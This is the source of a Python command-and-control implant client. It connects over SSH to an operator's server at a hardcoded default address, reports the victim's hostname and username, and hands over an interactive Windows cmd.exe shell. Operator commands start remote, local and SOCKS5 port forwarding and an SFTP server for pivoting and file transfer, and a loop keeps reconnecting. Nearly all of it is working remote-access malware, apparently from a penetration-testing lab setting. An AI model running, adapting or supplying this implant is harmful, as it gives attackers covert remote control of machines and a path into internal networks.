import paramiko
import os
import socket
import getpass
import time
import logging
import argparse
import platform
import threading
from typing import Dict, Any
from .forwarding.forwarding_handler import PortForwardingManager
from .sftp.sftpservice import SFTPService

# logging setup
inglogging = logging.getLogger('C2Client')
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)

class C2Client:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.ssh_client = None
        self.transport = None
        self.channel = None
        self.process = None
        self.running = True
        self.reconnect_delay = 5
        self.system_info = self._gather_system_info()
        self.forwarder = None
        self.sftp_service = None

    def _gather_system_info(self) -> Dict[str, str]:
        return {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'platform': platform.system(),
            'version': platform.version(),
            'architecture': platform.machine()
        }

    def connect(self) -> bool:
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            logging.debug(f"Connecting to {self.config['server_ip']}:{self.config['server_port']}")
            self.ssh_client.connect(
                self.config['server_ip'],
                port=self.config['server_port'],
                username=self.config['username'],
                password=self.config['password'],
                timeout=10
            )
            self.transport = self.ssh_client.get_transport()
            self.channel = self.transport.open_session()
            self.channel.get_pty(term='vt100', width=80, height=24)
            self.channel.invoke_shell()

            if self.channel.active:
                # Initialize port forwarding manager and services
                self.forwarder = PortForwardingManager(self.transport, self.channel)
                self.sftp_service = SFTPService(self.forwarder)

                client_info = (
                    f"Implant checked in from {self.system_info['hostname']} "
                    f"as {self.system_info['username']}\r\n"
                )
                self.channel.send(client_info)
                logging.info("Successfully connected to C2 server")
                return True
            return False
        except Exception as e:
            logging.error(f"Connection error: {e}")
            return False

    def start_shell(self) -> bool:
        """Spawn a local Windows shell via winpty."""
        try:
            import winpty
            self.pty = winpty.PTY(cols=80, rows=24)
            proc_path = os.path.join(os.environ['SYSTEMROOT'], 'System32', 'cmd.exe')
            self.process = self.pty.spawn(proc_path)
            return True
        except Exception as e:
            logging.error(f"Error starting shell: {e}")
            return False

    def forward_io(self):
        def read_from_process():
            while self.running and self.pty and self.channel and self.channel.active:
                data = self.pty.read(4096)
                if data:
                    self.channel.send(data.encode())
        
        def read_from_channel():
            while self.running and self.channel.active:
                if self.channel.recv_ready():
                    data = self.channel.recv(1024).decode()
                    if self.process_command(data):
                        continue
                    self.pty.write(data)
                else:
                    time.sleep(0.05)

        t1 = threading.Thread(target=read_from_process, daemon=True)
        t2 = threading.Thread(target=read_from_channel, daemon=True)
        t1.start(); t2.start()
        while t1.is_alive() and t2.is_alive() and self.running:
            time.sleep(0.5)

    def process_command(self, command: str):
        """
        Process special commands from the server
        
        Args:
            command: The command string to process
            
        Returns:
            bool: True if the command was processed, False otherwise
        """
        parts = command.strip().split()
        if not parts:
            return False
        
        # SFTP commands
        if parts[0] == '!sftp':
            if len(parts) < 2:
                self.channel.send("Usage: !sftp start|stop [port]\r\n")
                return True
                
            action = parts[1]
            port = int(parts[2]) if len(parts) > 2 else 3333
            
            if action == 'start':
                return self.sftp_service.start_sftp_server(port)
            elif action == 'stop':
                return self.sftp_service.stop_sftp_server(port)
            else:
                self.channel.send("Unknown action. Use start or stop.\r\n")
                return True
                
        # Remote port forwarding commands
        if parts[0] == '!rforward':
            if len(parts) < 2:
                self.channel.send("Usage: !rforward start REMOTE_PORT LOCAL_HOST LOCAL_PORT\r\n")
                self.channel.send("       !rforward stop REMOTE_PORT\r\n")
                return True
                
            action = parts[1]
            
            if action == 'start':
                if len(parts) < 5:
                    self.channel.send("Usage: !rforward start REMOTE_PORT LOCAL_HOST LOCAL_PORT\r\n")
                    return True
                    
                remote_port = int(parts[2])
                local_host = parts[3]
                local_port = int(parts[4])
                
                # Create a handler that forwards to the specified local host:port
                def create_handler(channel):
                    def handler():
                        try:
                            # Connect to local service
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.connect((local_host, local_port))
                            # Start bidirectional forwarding
                            self.forwarder._bidirectional_forward(sock, channel)
                        except Exception as e:
                            logging.error(f"Error handling remote forwarding: {e}")
                            if channel:
                                channel.close()
                    return handler
                
                return self.forwarder.start_remote_forwarding(remote_port, create_handler)
                
            elif action == 'stop':
                if len(parts) < 3:
                    self.channel.send("Usage: !rforward stop REMOTE_PORT\r\n")
                    return True
                    
                remote_port = int(parts[2])
                return self.forwarder.stop_remote_forwarding(remote_port)
                
            else:
                self.channel.send("Unknown action. Use start or stop.\r\n")
                return True
        
        # Dynamic port forwarding (SOCKS5) commands
        if parts[0] == '!dynamic':
            if len(parts) < 2:
                self.channel.send("Usage: !dynamic start LOCAL_PORT\r\n")
                self.channel.send("       !dynamic stop LOCAL_PORT\r\n")
                return True
                
            action = parts[1]
            
            if action == 'start':
                if len(parts) < 3:
                    self.channel.send("Usage: !dynamic start LOCAL_PORT\r\n")
                    return True
                    
                local_port = int(parts[2])
                return self.forwarder.start_remote_socks(local_port)
                
            elif action == 'stop':
                if len(parts) < 3:
                    self.channel.send("Usage: !dynamic stop LOCAL_PORT\r\n")
                    return True
                    
                local_port = int(parts[2])
                return self.forwarder.stop_remote_forwarding(local_port)
                
            else:
                self.channel.send("Unknown action. Use start or stop.\r\n")
                return True
        
        # Local port forwarding commands
        if parts[0] == '!lforward':
            if len(parts) < 2:
                self.channel.send("Usage: !lforward start LOCAL_PORT REMOTE_HOST REMOTE_PORT\r\n")
                self.channel.send("       !lforward stop LOCAL_PORT\r\n")
                return True
                
            action = parts[1]
            
            if action == 'start':
                if len(parts) < 5:
                    self.channel.send("Usage: !lforward start LOCAL_PORT REMOTE_HOST REMOTE_PORT\r\n")
                    return True
                    
                local_port = int(parts[2])
                remote_host = parts[3]
                remote_port = int(parts[4])
                
                return self.forwarder.start_local_forwarding(local_port, remote_host, remote_port)
                
            elif action == 'stop':
                if len(parts) < 3:
                    self.channel.send("Usage: !lforward stop LOCAL_PORT\r\n")
                    return True
                    
                local_port = int(parts[2])
                return self.forwarder.stop_local_forwarding(local_port)
                
            else:
                self.channel.send("Unknown action. Use start or stop.\r\n")
                return True
        
        # Status command - show all active forwarding
        if parts[0] == '!status':
            self.channel.send("\r\n=== Active Port Forwarding ===\r\n")
            
            # Remote forwarding
            if self.forwarder.remote_forward_threads:
                self.channel.send("Remote forwarding:\r\n")
                for port in self.forwarder.remote_forward_threads:
                    if self.forwarder.remote_forward_threads[port].is_alive():
                        self.channel.send(f"  Remote port {port}\r\n")
            
            # Local forwarding
            if self.forwarder.local_forward_threads:
                self.channel.send("Local forwarding:\r\n")
                for port in self.forwarder.local_forward_threads:
                    if self.forwarder.local_forward_threads[port].is_alive():
                        self.channel.send(f"  Local port {port}\r\n")
            
            # Dynamic forwarding
            if self.forwarder.dynamic_threads:
                self.channel.send("Dynamic (SOCKS5) forwarding:\r\n")
                for port in self.forwarder.dynamic_threads:
                    if self.forwarder.dynamic_threads[port].is_alive():
                        self.channel.send(f"  SOCKS5 proxy on port {port}\r\n")
            
            # SFTP
            if hasattr(self, 'sftp_service') and self.sftp_service.active_ports:
                self.channel.send("SFTP servers:\r\n")
                for port in self.sftp_service.active_ports:
                    self.channel.send(f"  SFTP on port {port}\r\n")
            
            if (not self.forwarder.remote_forward_threads and 
                not self.forwarder.local_forward_threads and 
                not self.forwarder.dynamic_threads and
                not (hasattr(self, 'sftp_service') and self.sftp_service.active_ports)):
                self.channel.send("No active forwarding\r\n")
                
            return True
        
        # General help command
        if parts[0] == '!help':
            self.channel.send("\r\n=== Available Commands ===\r\n")
            self.channel.send("!rforward start REMOTE_PORT LOCAL_HOST LOCAL_PORT - Forward remote port to local host:port\r\n")
            self.channel.send("!rforward stop REMOTE_PORT - Stop remote port forwarding\r\n")
            self.channel.send("!lforward start LOCAL_PORT REMOTE_HOST REMOTE_PORT - Forward local port to remote host:port\r\n")
            self.channel.send("!lforward stop LOCAL_PORT - Stop local port forwarding\r\n")
            self.channel.send("!dynamic start LOCAL_PORT - Start SOCKS5 proxy on local port\r\n")
            self.channel.send("!dynamic stop LOCAL_PORT - Stop SOCKS5 proxy\r\n")
            self.channel.send("!sftp start [PORT] - Start SFTP server on remote port (default: 3333)\r\n")
            self.channel.send("!sftp stop [PORT] - Stop SFTP server (default: 3333)\r\n")
            self.channel.send("!status - Show active forwarding\r\n")
            self.channel.send("!help - Show this help\r\n")
            return True
            
        return False  # Command not processed

    def command_loop(self):
        while self.running:
            if not self.channel or not self.channel.active:
                logging.info("Reconnecting...")
                self.disconnect()
                time.sleep(self.reconnect_delay)
                if not self.connect():
                    continue
                self.start_shell()
                threading.Thread(target=self.forward_io, daemon=True).start()
            time.sleep(1)

    def disconnect(self):
        self.running = False
        try:
            # Stop all port forwarding
            if self.forwarder:
                self.forwarder.stop_all_forwarding()
            
            # Close channels and connections
            if self.channel:
                self.channel.close()
            if self.ssh_client:
                self.ssh_client.close()
        except Exception:
            pass

    def run(self):
        if self.connect():
            self.start_shell()
            threading.Thread(target=self.forward_io, daemon=True).start()
            self.command_loop()


def parse_arguments():
    p = argparse.ArgumentParser()
    p.add_argument("--server", default="10.10.16.3")
    p.add_argument("--port", type=int, default=2222)
    p.add_argument("--username", default="implant")
    p.add_argument("--password", default="implant")
    p.add_argument("--debug", action="store_true")
    return p.parse_args()


def main():
    args = parse_arguments()
    if args.debug:
        logging.getLogger('C2Client').setLevel(logging.DEBUG)
    cfg = {'server_ip': args.server, 'server_port': args.port,
           'username': args.username, 'password': args.password}
    C2Client(cfg).run()


if __name__ == '__main__':
    main()